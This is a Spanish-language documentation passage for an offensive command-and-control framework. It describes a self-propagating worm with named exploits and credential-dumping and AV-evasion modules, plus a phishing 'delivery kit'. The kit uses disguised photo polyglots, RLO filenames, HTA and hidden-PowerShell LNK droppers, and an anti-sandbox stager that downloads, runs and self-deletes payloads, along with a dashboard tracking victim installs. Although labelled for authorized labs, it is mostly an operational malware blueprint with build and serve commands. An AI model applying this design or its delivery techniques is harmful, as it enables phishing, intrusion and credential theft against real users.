| **Credenciales efímeras** | Limpia después de usar (zeroize) |
| **Auto-eliminación** | Expira después de tiempo configurable |
| **Kill switch** | Instrucción KILL/PAUSE/RESUME vía DNS TXT |
| **Encriptación** | AES-256-GCM para tráfico y configuración |
| **Sin dependencias** | Binario estático ~494KB, sin DLLs externas |

### Archivos del Worm (12 módulos, ~45 archivos)

```
modules/lateral-rust/
├── Cargo.toml
├── .gitignore
├── worm.exe                              # Binario compilado (494KB)
├── src/
│   ├── main.rs                           # Entry point
│   ├── lib.rs                            # Library exports
│   ├── config.rs                         # WormConfig (repr C)
│   ├── entry/
│   │   ├── mod.rs
│   │   ├── uac.rs                        # 5 UAC bypass methods
│   │   ├── bluekeep.rs                   # CVE-2019-0708
│   │   ├── zerologon.rs                  # CVE-2020-1472
│   │   └── proxylogon.rs                 # CVE-2021-26855
│   ├── lateral/
│   │   ├── mod.rs
│   │   ├── wmi.rs                        # IWbemLocator/IWbemServices
│   │   ├── pth.rs                        # Pass-the-Hash
│   │   ├── ntlm.rs                       # NTLMv2 nativo
│   │   ├── smb_relay.rs                  # SMB Relay
│   │   └── psexec.rs                     # SCM service
│   ├── credential/
│   │   ├── mod.rs
│   │   ├── lsass.rs                      # MiniDumpWriteDump
│   │   ├── sam.rs                        # SAM/SYSTEM
│   │   └── dpapi.rs                      # CryptUnprotectData
│   ├── pivot/
│   │   ├── mod.rs
│   │   ├── double.rs                     # TCP relay async
│   │   └── socks5.rs                     # SOCKS5 server
│   ├── propagation/
│   │   ├── mod.rs
│   │   ├── worm.rs                       # BFS + orchestrator
│   │   ├── scanner.rs                    # Async port scanner
│   │   ├── deployer.rs                   # WMI→PsExec→DCOM
│   │   └── evaluator.rs                  # Target scoring
│   ├── dead_drop/
│   │   ├── mod.rs
│   │   ├── dns.rs                        # DNS TXT resolver
│   │   └── github.rs                     # GitHub README
│   ├── command/
│   │   ├── mod.rs
│   │   ├── parser.rs                     # Instruction parser
│   │   └── executor.rs                   # Command executor
│   ├── beacon/
│   │   ├── mod.rs
│   │   ├── https.rs                      # HTTPS beacon
│   │   └── evaluator.rs                  # Score evaluation
│   ├── inject/
│   │   ├── mod.rs
│   │   ├── hollowing.rs                  # Process hollowing
│   │   ├── service.rs                    # Service deploy
│   │   └── reflective.rs                 # Reflective DLL
│   ├── evasion/
│   │   ├── mod.rs
│   │   ├── etw.rs                        # ETW patch
│   │   ├── amsi.rs                       # AMSI patch
│   │   ├── unhook.rs                     # ntdll unhook
│   │   └── sleep.rs                      # Sleep obfuscation
│   ├── crypto/
│   │   ├── mod.rs
│   │   ├── aes.rs                        # AES-256-GCM
│   │   ├── ntlm.rs                       # NTLMv2
│   │   └── keys.rs                       # Key derivation
│   └── protocol/
│       ├── mod.rs
│       ├── smb.rs                        # SMB client
│       ├── http.rs                       # HTTP client
│       └── dns.rs                        # DNS client
└── target/
    └── x86_64-pc-windows-gnu/
        └── release/
            └── worm.exe                  # 494KB
```

---

## Módulo Extra: Delivery Kit (Acceso Inicial)

> **ADVERTENCIA**: vectores de entrega y evasión para Red Team autorizado / lab.
> No ejecutar fuera de entorno de pruebas con excepciones de Defender aplicadas.

**Ubicación:** `delivery/` — kit independiente (Python + Go) para la fase de acceso
inicial: prepara la "foto" que se envía (WhatsApp/SMS/email), sirve el landing, entrega
el payload cifrado y mide el funnel de la campaña en tiempo real.

### Qué es exactamente

El Delivery Kit es un **subsistema orquestador de acceso inicial**: no sustituye al C2
core, lo **alimenta**. Su trabajo termina donde empieza el C2: consigue que un agente
(Android o Windows) llegue al dispositivo víctima, y ese agente hace beacon hacia el
servidor Go (8443) igual que el resto de agentes. El kit, por tanto, añade la fase
"cómo entra el agente" al framework y aporta métricas propias de campaña (funnel).

Qué **no** es: no es un exploit (sin 0-click), no es el C2 (no gestiona sesiones ni
comandos), y no es un módulo acoplado al servidor Go (funciona como proceso aparte con
almacenamiento propio).

### Posición en la kill chain (MITRE ATT&CK)

| Técnica | Cómo la implementa el kit |
|---------|---------------------------|
| **T1566 / T1189** (phishing / drive-by) | Landing "photo viewer" y "fake system update", envío de la foto por chat |
| **T1204.002** (ejecución por usuario) | Poliglota APK/JPEG, merge JPEG+EXE, HTA, LNK — siempre hay un 1-click |
| **T1105** (ingress tool transfer) | `/payload` y `/d/<token>` sirven el stage/agente al dispositivo |
| **T1140** (deobfuscación) | XOR-SHA256 en stage.py, LSB stego en memoria, decodificación en el stager |
| **T1027.003** (datos ofuscados) | Payload nunca viaja en claro: ni en el APK de entrega ni en el EXE |
| **T1497** (evasión de sandbox) | Anti-sandbox del stager Go: RAM, cores, uptime, MAC, BIOS + jitter 30–90s |
| **T1071** (C2) | El agente entregado beacon al C2 core 8443; el stager solo es trampolín |

### Cómo se conecta al proyecto

```
GUI C# (C2Dect)
  └─ MainWindow: TOOLS ▸ "Delivery (APK/imagen)"
       └─ DeliveryWindow (botones: Polyglota / Stage / Serve / Stop /
            Win merge / Win HTA / Win LNK / Stego / Stager build)
            └─ lanza delivery/delivery_cli.py (proceso externo)

delivery_cli.py  →  delivery/serve.py   (servidor HTTP 0.0.0.0:8899, background)
                     ├─ /dash  (dashboard HTML del funnel)
                     ├─ /index.html  /update.html  /landing   → evento visit
                     ├─ *.jpg                                → evento view
                     ├─ *.apk  /payload  /d/<token>          → evento download / stage_fetch / token_delivery
                     ├─ /checkin?id=A  /beacon?id=A          → evento install / beacon
                     ├─ /honey*  (pista falsa, responde 404) → evento honey
                     └─ /metrics  /api/metrics               → JSON del funnel

Agentes:
  Android (app-debug.apk)  → checkin/beacon a http://IP:8899/checkin?id=A
  Windows (stager.exe)     → GET /d/<token> → XOR decrypt → %TEMP%\svc-NNNNNN.exe
                             → ejecución oculta → self-delete (3s)
  El payload entregado es el agente final → beacon al C2 core (server Go, 8443)

Almacenamiento propio (NO usa el SQLite del C2):
  delivery/delivery.conf.json   → port 8899 + key XOR del stage
  delivery/out/telemetry.jsonl  → eventos del funnel (append, formato JSONL)
  delivery/out/tokens.json      → tokens single-use (TTL, IP fija, reuso → 410)
  delivery/out/                 → payload.bin, stage.json, poliglotas, stagers
```

Componente por componente, la conexión es:

| Componente | Se conecta a | Mediante |
|------------|--------------|----------|
| `gui/C2Dect` (MainWindow → DeliveryWindow) | `delivery/delivery_cli.py` | Proceso externo (`RunCli`, argumentos como `win-merge --jpeg ...`) |
| `delivery_cli.py` | `serve.py` | Arranque en background (`serve`), PID en `out/serve.pid`, parada con `stop` (taskkill) |
| `serve.py` | Víctima (navegador/dispositivo) | HTTP `0.0.0.0:8899` (landing, payload, checkin, beacon) |
| `stage.py` (CLI) | `serve.py` | Genera `out/payload.bin` + `out/stage.json` que `/payload` sirve |
| `polyglot_gen.py` / `win_polyglot.py` (CLI) | Carpeta `out/` | Escriben los archivos de entrega que sirve el servidor |
| `evasion/stager_build.py` | Go toolchain + `stager.go` | Compila `out/stager.exe` con URL/key/stego inyectados (polimorfismo) |
| `evasion/stego.py` (CLI) | `out/` | `stego-hide` → PNG con payload; el stager (`--stego`) lo extrae |
| `token` (CLI) | `out/tokens.json` | Crea token single-use; `serve.py` lo valida en `/d/<token>` |
| Stager / agente final | C2 core | El EXE/APK entregado es el agente real → beacon HTTPS/TCP al server Go 8443 |

### Protocolo HTTP del servidor de entrega

| Endpoint | Respuesta | Evento de telemetría | Uso |
|----------|-----------|----------------------|-----|
| `/dash`, `/dashboard`, `/` | 200 HTML dashboard | — | Panel del operador (en `DASH_HTML`) |
| `/metrics`, `/api/metrics` | 200 JSON | — | Funnel completo para GUI/CLI |
| `/index.html`, `/update.html`, `/landing` | 200 HTML landing | `visit` | Página "photo viewer" / "fake update" |
| `/<foto>.jpg` | 200 imagen | `view` | La "foto" que ve la víctima |
| `/<foto>.jpg.apk` | 200 APK | `download` | Poliglota Android |
| `/payload` | 200 blob XOR | `stage_fetch` | Stage cifrado (Android loader / payload Windows) |
| `/d/<token>` | 200 blob / 403 / 404 / 410 | `token_delivery`, `token_mismatch`, `token_invalid`, `token_reuse`, `token_expired` | Token single-use |
| `/checkin?id=<A>` | 200 "ok" | `install` | Primer contacto del agente instalado |
| `/beacon?id=<A>` | 200 "ok" | `beacon` | Beacons periódicos del agente |
| `/honey*` | 404 (deliberado) | `honey` | Pista falsa para scanners/reconocimiento |

### Telemetría y funnel

Cada petición se registra en `out/telemetry.jsonl` (append, una línea por evento):

```json
{"ts": "2026-08-17T22:32:55", "kind": "beacon", "ip": "192.168.1.7",
 "path": "/beacon?id=AG-001", "ua": "Mozilla/5.0 ...", "agent_id": "AG-001"}
```

`compute_metrics()` consolida: `visits`, `views`, `downloads`, `installs`, `beacons`,
`stage_fetches`, `token_deliveries`, `honey_hits`, `token_invalid/reuse/expired/mismatch`,
`unique_ips`, `active_agents` (último beacon ≤ 10 min), `paths` y `agents`. El CLI
`metrics` muestra el funnel con conversiones (visit→download, download→install,
install→beacon) y el dashboard `/dash` lo pinta en HTML.

### Stage del payload (pattern MiningDropper/Zombinder)

`stage.py` extrae el `.dex` más grande del APK (o `--dex` directo) y produce:
- `out/payload.bin` — DEX cifrado con XOR keystream `SHA-256(key || counter LE)`
- `out/payload.sha256` — hash del blob para verificación
- `out/stage.json` — manifiesto:
```json
{"cipher": "xor-sha256", "key_ref": "Config.STAGE_KEY", "size": 12345,
 "raw_size": 54321, "sha256": "...", "urls": {
   "payload": "/payload", "checkin": "/checkin?id=%AGENT_ID%",
   "beacon": "/beacon?id=%AGENT_ID%"}}
```

Idea: el APK entregado solo lleva un loader mínimo; **el agente completo nunca viaja en
la entrega** — se descarga post-install. La key se guarda en `delivery.conf.json`.

### Tokens single-use

`delivery_cli.py token --file out/stager.exe [--ip X.X.X.X] [--ttl 3600]` crea un token
hex-128-bits en `out/tokens.json`:

| Estado | Servidor | Evento |
|--------|----------|--------|
| Token válido, primera vez | 200 + blob | `token_delivery` |
| Token no existe | 404 | `token_invalid` |
| IP distinta a la fijada (si `ip` se fijó) | 403 | `token_mismatch` |
| Token ya usado | 410 | `token_reuse` |
| TTL vencido | 410 | `token_expired` |

Al usar el token se marca `"used": true` y se persiste de inmediato (single-use real,
no solo en memoria).

### Stager Go (Windows) — `evasion/stager.go`

Compilado por `stager_build.py` con `go build -trimpath -ldflags "-s -w -H windowsgui"`
(CGO_ENABLED=0, ventana sin consola, versiones de Go 1.24+). Flujo de ejecución:

1. **Anti-sandbox (T1497)** — si alguna falla, `os.Exit(0)` silencioso:
   - RAM total < 2 GB → exit
   - CPUs < 2 → exit
   - Uptime < 10 minutos → exit
   - OUI del MAC en lista de vendors VM (VMware/VirtualBox/QEMU/KVM) → exit
   - BIOS con marcadores VM (consulta `HKLM\HARDWARE\DESCRIPTION\System\BIOS`) → exit
2. **Delay jitter** 30–90 s aleatorio (evade sandboxes con timeout corto).
3. **Descarga** GET a `%%PAYLOAD_URL%%` (normalmente `/d/<token>`):
   - modo normal: el blob es el payload cifrado (XOR-SHA256)
   - modo `--stego`: el blob es un PNG; extrae el payload por LSB (patrón Caminho)
4. **Descifrado XOR-SHA256** (keystream idéntico a `stage.py`).
5. **Escribe** `%TEMP%\svc-<6 dígitos>.exe`.
6. **Ejecuta** oculto (SW_HIDE + CREATE_NO_WINDOW), sin esperar.
7. **Self-delete** del stager a los ~3 s.

**Polimorfismo**: cada build con `stager_build.py` inyecta URL, key y título distintos →
binario distinto por build (verificado: hashes distintos por build). Parámetros:
`--url` (obligatorio, ej: `http://IP:8899/d/<token>`), `--key` (si vacío → el de
`delivery.conf.json` o autogenerado), `--stego` (payload embebido en PNG), `--out`.

### Stego LSB PNG — `evasion/stego.py`

Formato (patrón Caminho): los 32 primeros bits de los pixeles (LSB de cada byte RGB)
codifican la **longitud big-endian**; después el payload bit a bit (15 bytes por pixel).
`--key` cifra previamente con XOR-SHA256. Roundtrip verificado. El stager con `--stego`
hace la extracción en memoria — el payload nunca toca disco.

### Vectores de entrega

| Vector | Interacción | Generador | Descripción |
|--------|-------------|-----------|-------------|
| **Foto poliglota** | 1-click | `polyglot_gen.py` | JPEG+APK válidos en un archivo: galería lo ve como imagen, PackageInstaller como APK (patrón XLoader) |
| **Win merge** | 1-click | `win_merge` | JPEG+EXE concatenados con marcador `C2DECT-WIN-BOUNDARY` + copia RLO (`foto<U+202E>_gpj.exe`) |
| **Win HTA** | 1-click | `win_hta` | HTA con VBScript: MSXML2 descarga EXE en base64 → ADODB.Stream escribe `%TEMP%\svc-host.exe` → ejecuta oculto |
| **Win LNK** | 1-click | `win_lnk` | LNK con ícono de imagen que lanza PowerShell (`-ep bypass -w hidden` + descarga de `--url`); creado vía COM (WScript.Shell) |
| **Stager Go** | 0 | `stager-build` | Trampolín anti-sandbox descrito arriba; se combina con merge/hta/lnk como el EXE a entregar |
| **Stego PNG** | 0 | `stego-hide` | La "foto" navegable con payload LSB; el stager `--stego` lo extrae |
| **Token single-use** | 0 | `token` | Enlace `/d/<token>` de un solo uso para el stager |

### GUI (C2Dect)

`MainWindow` ▸ TOOLS ▸ **"Delivery (APK/imagen)"** abre `DeliveryWindow` con botones que
mapean 1:1 al CLI:

| Botón | Comando lanzado |
|-------|-----------------|
| Polyglota | `poly --apk <selección> --jpeg <selección> --out ...` |
| Stage | `stage --apk <selección>` |
| Serve / Stop | `serve` / `stop` |
| Win merge / HTA / LNK | `win-merge --jpeg ... --exe ...` / `win-hta ...` / `win-lnk --exe ... --out ...` |
| Stego | `stego-hide --png <selección> --payload <selección> --out ...` |
| Stager build | `stager-build --url http://127.0.0.1:8899/payload --out out/stager` |
| Open dashboard | `dash` (abre `/dash` en el navegador) |

### CLI completo

```bash
python delivery/delivery_cli.py <comando> [args]
```

| Comando | Descripción |
|---------|-------------|
| `conf` / `conf-set K V` | Ver / fijar `delivery.conf.json` (port, key del stage) |
| `poly --apk A --jpeg J --out O` | Poliglota JPEG+APK |
| `stage --apk A [--key K]` | Stage XOR-SHA256 (`payload.bin` + `stage.json`) |
| `win-merge --jpeg J --exe E --out O` | JPEG+EXE con boundary + RLO |
| `win-hta --jpeg J --exe E --out O` | HTA con EXE embebido en base64 (preferir EXE < 3 MB) |
| `win-lnk --exe E --out O [--url U] [--icon I]` | LNK por COM con ícono de imagen |
| `token --file F [--ip X] [--ttl S]` | Token single-use `/d/<token>` |
| `stego-hide --png P --payload F --out O [--key K]` | Ocultar payload en PNG |
| `stego-extract --png P --out O [--key K]` | Extraer payload del PNG |
| `stager-build --url U [--key K] [--stego] --out O` | Compilar stager polimórfico |
| `serve [--port N]` | Servidor de entrega (background, PID en `out/serve.pid`) |
| `stop` | Detener servidor |
| `status` | Estado del servidor + URLs |
| `metrics` | Funnel + conversiones + agentes activos |
| `dash` | Abrir dashboard en navegador |

### Archivos clave

| Archivo | Descripción |
|---------|-------------|
| `delivery/delivery_cli.py` | CLI de operador (usado por la GUI) |
| `delivery/serve.py` | Servidor HTTP 8899: landing, payload, tokens, honey, `/metrics`, `/dash` |
| `delivery/stage.py` | Stage XOR-SHA256 (`payload.bin`, `payload.sha256`, `stage.json`) |
| `delivery/polyglot_gen.py` | Poliglota JPEG+APK (ofreosets ZIP parcheados) |
| `delivery/win_polyglot.py` | Kit Windows: `merge` / `hta` / `lnk` |
| `delivery/evasion/stego.py` | LSB stego PNG (hide/extract, key opcional) |
| `delivery/evasion/stager.go` | Stager Go anti-sandbox (RAM/cores/uptime/MAC/BIOS, jitter, self-delete) |
| `delivery/evasion/stager_build.py` | Builder: template + `go build -trimpath -s -w -H windowsgui` |
| `delivery/delivery.conf.json` | Config: `port` (8899) + `key` XOR del stage |
| `delivery/out/` | Artefactos: `payload.bin`, `stage.json`, `telemetry.jsonl`, `tokens.json`, `serve.pid`, poliglotas y stagers generados |

### Windows Defender (entorno lab)

Excepciones necesarias:

| Ruta / binario | Motivo |
|----------------|--------|
| Carpeta `C2-DECT` (proyecto) | Stagers, poliglotas y payloads en `delivery/out/` |
| `powershell.exe` — ASR regla scripts ofuscados (GUID `b9e5e46c-7c35-4a3a-b4a3-5bebad1bbcb4`) | El LNK lanza PowerShell ofuscado |
| `python.exe` (Python 3.12) | El kit y la GUI lanzan scripts |
| `taskkill.exe` | `stop` mata el PID del servidor |
| `%TEMP%\svc-host.exe` | Salida del HTA |
| `%TEMP%\svc-*.exe` | Salida del stager Go |

### Límites honestos

- Cifrado XOR-SHA256, no AES-GCM (ofuscación, no criptografía); el stager escribe a
  `%TEMP%` (huella en disco) y el self-delete puede fallar si el EXE sigue en uso.
- URL y key del stager son literales en el binario: `strings` las ve. Ofuscar en
  build-time está en el roadmap.
- LNK descargado por red arrastra MOTW (mitigación: contenedores `.iso`/`.vhd`,
  pendiente).
- Honeypots simples (solo 404): no hay geolocalización, fingerprint ni detección de
  análisis.
- Telemetría separada del C2 core: el funnel no alimenta SQLite del servidor (integración
  `/api/delivery/*` pendiente).
- El stager se compila en la máquina del operador: requiere Go 1.24+ instalado.

---

## Módulo Extra: Reconocimiento y Búsqueda de Vulnerabilidades

> **ADVERTENCIA**: auditoría y búsqueda de CVEs para Red Team autorizado / lab.
> Genera reportes del dispositivo donde se ejecuta (nunca remoto).

**Ubicación:** `reconocimiento-c2/` — kit independiente (Python puro, sin dependencias
externas: stdlib + `tkinter` para la GUI). Ejecuta **en el dispositivo objetivo** y
produce un reporte JSON + HTML con puntuación de riesgo por categoría.

### Qué es

Dos capacidades en una herramienta:

1. **Auditoría completa del dispositivo** (11 módulos clásicos): sistema/parches,
   usuario y grupos, privilegios de token (SeImpersonate/SeDebug…), servicios,
   permisos de archivos y DLL, tareas programadas, credenciales (cmdkey, AutoLogon,
   AlwaysInstallElevated, RDP history), autoruns/persistencia, red y puertos,
   procesos, software instalado.
2. **Búsqueda de vulnerabilidades** (módulo 12, v2.1.0): chequea el build de Windows
   y el software contra una **base local offline** de CVEs públicos, y las
   configuraciones inseguras clásicas. Cada hallazgo lleva **CVSS v3, CVE, exploit
   disponible (con módulos Metasploit) y referencias** de Microsoft/NVD.

### Cómo se conecta al proyecto

```
GUI C# (C2Dect)
  └─ MainWindow: TOOLS ▸ "Recon + Vulns"
       └─ ReconWindow (botones: Scan + HTML / Scan solo / Abrir GUI / Vuln DB / Abrir último reporte)
            └─ lanza reconocimiento-c2/recon_c2.py (proceso externo)

recon_c2.py
  ├─ scan [--output X]   → ejecuta los 12 módulos in situ → reports/recon_<HOST>_<TS>.{json,html}
  ├─ gui                 → GUI Tkinter completa (scan, pie de severidades, categorías)
  ├─ vuln-db             → imprime la base local de CVEs/reglas (offline)
  ├─ html reporte.json   → regenera el HTML desde un JSON
  └─ summary reporte.json→ resumen por categoría

Almacenamiento:
  reconocimiento-c2/reports/            → reportes JSON + HTML autocontenidos
  reconocimiento-c2/core/vulndb.py      → base de CVEs (6 OS + 9 software + 16 reglas)
```

### Base de vulnerabilidades local (offline)

| Tipo | Contenido |
|------|-----------|
| **CVEs de OS** | EternalBlue (CVE-2017-0144), BlueKeep (CVE-2019-0708), ZeroLogon (CVE-2020-1472), PrintNightmare (CVE-2021-34527), HiveNightmare (CVE-2021-36934), TCP/IP RCE (CVE-2024-38063) |
| **CVEs de software** | Log4Shell (CVE-2021-44228), Apache httpd 2.4.49/50 (CVE-2021-41773/42013), PHP-CGI (CVE-2024-4577), UltraVNC (CVE-2023-46230), 7-Zip (CVE-2022-29072), WinRAR (CVE-2023-38831), Git (CVE-2023-22490) |
| **Reglas de configuración** | Spooler, SMBv1, RDP/NLA, LLMNR, NTLMv1, WinRM, RemoteRegistry, Defender off, WU off, LSA PPL, WDigest, Credential Guard, PS ExecutionPolicy/logging, Guest, Unattend/Panther |

Cada hallazgo del módulo `vulnerabilidades` se enriquece con `cvss` (CVSS v3), `cve`,
`exploit` (módulo MSF o técnica pública) y `references`. El resumen del reporte
incluye `cve_total`, `cvss_max` y `top_cves` (ordenadas por CVSS).

### Módulos de auditoría (12)

| # | Módulo | Detecta |
|---|--------|---------|
| 1 | sistema | OS/build/parches, firewall, UAC |
| 2 | usuario | Grupos peligrosos, integridad del token |
| 3 | privilegios | SeImpersonate/SeDebug/SeBackup… |
| 4 | servicios | Servicios de terceros como SYSTEM |
| 5 | archivos | Directorios/DLL escribibles (DLL hijacking) |
| 6 | tareas | Tareas programadas (abuso/persistencia) |
| 7 | credenciales | cmdkey, AutoLogon, AlwaysInstallElevated |
| 8 | autoruns | Run keys, Startup, WMI persistence |
| 9 | red | Puertos, servicios en escucha |
| 10 | procesos | Procesos y anomalías |
| 11 | software | Inventario + versiones interesantes |
| 12 | vulnerabilidades | CVEs por build/software + config insegura (CVSS/CVE/exploit) |

### Uso

```bash
cd reconocimiento-c2
python recon_c2.py scan                  # auditoría + CVEs → JSON + HTML
python recon_c2.py scan --output reports # en otra carpeta
python recon_c2.py vuln-db               # ver la base de CVEs
python recon_c2.py gui                   # GUI Tkinter
# Desde la GUI de C2-DECT: TOOLS ▸ "Recon + Vulns"
```

### Reporte

HTML autocontenido (sin librerías): badge de riesgo 0-100, conteos por severidad,
barras por categoría, pie de severidades, **sección Top CVEs** y detalle por hallazgo
con CVSS/CVE/Exploit/Referencias y respuesta completa (qué es, impacto, cómo
explotar, remediación, CWE).

### Límites honestos

- Base de CVEs **curada y estática**: no es un feed en vivo. Ampliable en
  `core/vulndb.py` (formato tabular).
- Los checks son de configuración/servicio: no ejecutan exploits ni validan el
  parche real (los hallazgos de build son "candidatos a validar").
- Ejecución in situ: el kit corre en la máquina auditada (no remoto).
- El comparador de versiones es tupla numérica simple (no semver completo).

---
